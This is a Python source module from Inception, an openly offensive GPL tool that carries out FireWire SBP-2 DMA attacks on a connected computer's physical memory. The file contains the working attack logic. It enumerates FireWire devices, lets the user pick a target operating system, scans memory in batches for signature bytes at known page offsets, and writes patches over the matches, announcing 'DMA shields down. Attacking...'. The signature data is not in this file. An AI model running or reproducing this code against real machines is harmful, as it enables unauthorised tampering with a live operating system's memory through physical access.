'''
Inception - a FireWire physical memory manipulation and hacking tool exploiting
IEEE 1394 SBP-2 DMA.

Copyright (C) 2012  Carsten Maartmann-Moe

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

Created on Jun 23, 2011

@author: Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy <n@tropy.org>
'''
from inception.firewire import FireWire
from inception.util import msg, MemoryFile, fail, bytelen, \
    int2binhex, separator, bytes2hexstr
import inception.settings as settings
import sys
import time
import os


def select_target(targets, selected=False):
    '''
    Provides easy selection of targets. Input is a list of targets (dicts)
    '''
    if len(targets) == 1:
        msg('*', 'Only one target present, auto-selected')
        return targets[0]
    if not selected: selected = input('[!] Please select target (or enter \'q\' to quit): ')
    nof_targets = len(targets)
    try:
        selected = int(selected)
    except:
        if selected == 'q': sys.exit()
        else:
            msg('!', 'Invalid selection, please try again. Type \'q\' to quit')
            return select_target(targets)
    if 0 < selected <= nof_targets:
        return targets[selected - 1]
    else:
        msg('!', 'Please enter a selection between 1 and ' + str(nof_targets) + '. Type \'q\' to quit')
        return select_target(targets)
    

def printdetails(target): # TODO: Fix this method
    '''
    Prints details about a target
    '''
    msg('*', 'The target module contains the following signatures:')
    separator()
    print('\tVersions:\t' + ', '.join(target['versions']).rstrip(', '))
    print('\tArchitectures:\t' + ', '.join(target['architectures']).rstrip(', '))
    for signature in target['signatures']:
        offsets = '\n\t\tOffsets:\t'
        for offset in signature['offsets']:
            offsets += hex(offset)
            if not offset is signature['offsets'][-1]: offsets += ', '
        print(offsets)
        sig = '\t\tSignature:\t0x'
        ioffs = 0
        patch = 0
        poffs = 0
        for chunk in signature['chunks']:
            diff = chunk['internaloffset'] - bytelen(chunk['chunk']) - 1 - ioffs
            sig += '__' * diff
            ioffs = chunk['internaloffset']
            sig += '{0:x}'.format(chunk['chunk'])
            try:
                patch = chunk['patch']
                poffs = chunk['patchoffset']
            except KeyError: pass
        print(sig)
        print('\t\tPatch:\t\t{0:#x}'.format(patch))
        print('\t\tPatch offset:\t{0:#x}'.format(poffs))
        
    separator()
    

def siglen(l):
    '''
    Accepts dicts with key 'internaloffset', and calculates the length of the 
    total signature in number of bytes
    '''
    index = value = 0
    for i in range(len(l)):
        if l[i]['internaloffset'] > value:
            value = l[i]['internaloffset']
            index = i
    # Must decrement bytelen with one since byte positions start at zero
    return bytelen(l[index]['chunk']) - 1 + value


def match(candidate, chunks):
    '''
    Matches a candidate read from memory with the signature chunks
    '''
    for c in chunks:
        ioffset = c['internaloffset']
        if c['chunk'] != candidate[ioffset:ioffset + len(c['chunk'])]:
            return False
    return True
    

def patch(device, address, chunks):
    '''
    Writes back to the device at address, using the patches in the signature
    chunks
    '''
    success = True
    for c in chunks:
        patch = c['patch']
        if not patch:
            continue
        ioffset = c['internaloffset']
        poffset = c['patchoffset']
        if not poffset: 
            poffset = 0
        realaddress = address + ioffset + poffset
        if patch:
            device.write(realaddress, patch)
            read = device.read(realaddress, len(patch))
            if settings.verbose:
                msg('*', 'Data written: 0x' + bytes2hexstr(patch))
                msg('*', 'Data read:    0x' + bytes2hexstr(read))
            if  read != patch:
                success = False
    return success
        

def searchanddestroy(device, target, memsize):
    '''
    Main search loop
    '''
    pageaddress = settings.startaddress
    signatures = target['signatures']

    # Add signature lengths in bytes to the dictionary, and replace integer
    # representations of the signatures and patches with bytes
    for signature in signatures:
        signature['length'] = siglen(signature['chunks'])
        offsets = signature['offsets'] # Offsets within pages
        for chunk in signature['chunks']:
            chunk['chunk'] = int2binhex(chunk['chunk'])
            try:
                chunk['patch'] = int2binhex(chunk['patch'])
            except KeyError:
                chunk['patch'] = None

    try:
        # Build a batch of read requests of the form: [(addr1, len1), ...] and
        # a corresponding match vector: [(chunks1, patchoffset1), ...]
        j = 0
        count = 0
        cand = b'\x00'
        r = []
        p = []
        while pageaddress < memsize:
            sig_len = len(signatures)
            
            for i in range(sig_len): # Iterate over signatures
                offsets = signatures[i]['offsets'] # Offsets within pages
                if isinstance(offsets, int):
                    offsets = [offsets] # Create a list if single offset
                chunks = signatures[i]['chunks'] # The chunks that is the sig
                length = signatures[i]['length'] # Sig length in bytes
                offset_len = len(offsets)
                
                for n in range(offset_len): # Iterate over offsets
                    address = pageaddress + offsets[n] + settings.PAGESIZE * j
                    r.append((address, length))
                    p.append(chunks)
                    count += 1
                    # If we have built a full vector, read from memory and
                    # compare to the corresponding signatures
                    if count == settings.vectorsize:
                        # Read data from device
                        m = 0
                        for caddr, cand  in device.readv(r):
                            if match(cand, p[m]):
                                print()
                                return (caddr, p[m])
                            m += 1                    
                        # Jump to next pages (we're finished with these)
                        mask = ~(settings.PAGESIZE - 0x01)
                        pageaddress = address & mask
                        if sig_len == i and offset_len == n:
                            pageaddress = pageaddress + settings.PAGESIZE
                            
                        # Zero out counters and vectors
                        j = 0
                        count = 0
                        r = []
                        p = []
                        
                        # Print status
                        mibaddr = pageaddress // settings.MiB
                        sys.stdout.write('[*] Searching, {0:>4d} MiB so far'.format(mibaddr))
                        if settings.verbose:
                            sys.stdout.write('. Sample data read: {0}'.format(bytes2hexstr(cand)[0:24]))
                        sys.stdout.write('\r')
                        sys.stdout.flush()
                         
            j += 1 # Increase read request count
            
    except IOError:
        print()
        fail('I/O Error, make sure FireWire interfaces are properly connected')
    except KeyboardInterrupt:
        print()
        fail('Aborted')
        raise KeyboardInterrupt
    
    # If we get here, we haven't found anything :-/
    print()    
    return (None, None)


def attack(targets):
    '''
    Main attack logic
    '''
    # Initialize and lower DMA shield
    if not settings.filemode:
        try:
            fw = FireWire()
        except IOError:
            fail('Could not initialize FireWire. Are the modules loaded into the kernel?')
        start = time.time()
        device_index = fw.select_device()
        # Print selection
        msg('*', 'Selected device: {0}'.format(fw.vendors[device_index]))

    # List targets
    msg('*', 'Available targets:')
    separator()
    for number, target in enumerate(targets, 1):
                msg(number, target['OS'] + ': ' + target['name'])
    separator()
       
    # Select target
    target = select_target(targets)
    
    # Print selection. If verbose, print selection with signatures
    msg('*', 'Selected target: ' + target['OS'] + ': ' + target['name'])
    if settings.verbose:
        printdetails(target)
    
    # Lower DMA shield or use a file as input, and set memsize
    device = None
    memsize = None
    if settings.filemode:
        device = MemoryFile(settings.filename, settings.PAGESIZE)
        memsize = os.path.getsize(settings.filename)
    else:
        elapsed = int(time.time() - start)
        device = fw.getdevice(device_index, elapsed)
        memsize = settings.memsize
    
    # Perform parallel search for all signatures for each OS at the known offsets
    msg('*', 'DMA shields down. Attacking...')
    address, chunks = searchanddestroy(device, target, memsize)
    if not address:
        # TODO: Fall-back sequential search?
        return None, None
    
    # Signature found, let's patch
    mask = 0xfffff000 # Mask away the lower bits to find the page number
    page = int((address & mask) / settings.PAGESIZE)
    msg('*', 'Signature found at {0:#x} (@page # {1})'.format(address, page))
    if not settings.dry_run:
        success = patch(device, address, chunks)
        if success:
            msg('*', 'Write-back verified; patching successful')
            msg('*', 'BRRRRRRRAAAAAWWWWRWRRRMRMRMMRMRMMMMM!!!')
        else:
            msg('!', 'Write-back could not be verified; patching may have been unsuccessful.')
    
    #Clean up
    device.close()
    
    return address, page
